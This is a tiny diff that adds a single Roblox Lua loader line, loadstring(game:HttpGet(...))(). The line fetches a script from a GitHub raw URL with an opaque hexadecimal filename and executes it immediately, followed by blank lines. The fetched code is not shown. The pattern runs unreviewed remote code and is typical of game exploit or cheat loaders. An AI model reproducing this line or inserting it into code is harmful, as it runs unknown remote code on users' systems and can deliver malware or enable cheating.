@@ -1,0 +1,15 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Cat558-uz/AGAIN/refs/heads/main/6233c14212ff1d41.lua.txt"))()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
